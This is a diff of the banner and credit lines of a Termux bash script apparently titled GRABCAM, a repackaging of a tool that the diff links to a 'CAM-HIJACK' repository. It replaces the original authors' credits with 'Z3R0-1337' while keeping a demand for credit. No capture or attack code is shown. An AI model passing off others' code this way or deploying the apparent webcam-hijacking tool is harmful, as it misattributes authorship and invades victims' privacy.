@@ -1,8 +1,7 @@
 #!/bin/bash
-# coded by: github.com/thelinuxchoice/saycheese
-# This script modified by Noob Hackers
+
+# This script modified by Z3R0-1337
 #@@2222222
-# Hearlty thanks for linuxchoice
 # If you use any part from this code, giving me the credits. Read the Lincense!
 clear
 termux-setup-storage
@@ -22,13 +21,13 @@ echo '
                         |__________|/
              ___  ____   __   ____   ___   __   _  _ 
             / __)(  _ \ / _\ (  _ \ / __) / _\ ( \/ )
-           ( (_ \ )   //    \ ) _ (( (__ /    \/ \/ \
+           ( (_ \ )   //    \ ) _ (( (__ /    \/ \/ \                BY :- Z3R0-1337
             \___/(__\_)\_/\_/(____/ \___)\_/\_/\_)(_& v1.1 ' |lolcat
 
                                                                                
 echo " "
-printf "      \e[1;77m v1.0 coded by github.com/thelinuxchoice/saycheese\e[0m \n"
-printf "          \e[1;77m v1.1 This reborn script by { Noob Hackers }\e[0m \n"
+printf "      \e[1;77m v1.0 coded by github.com/Z3R0-1337/CAM-HIJACK\e[0m \n"
+printf "          \e[1;77m v1.1 This reborn script by { Z3R0-1337 }\e[0m \n"
 
 printf "\n"
 
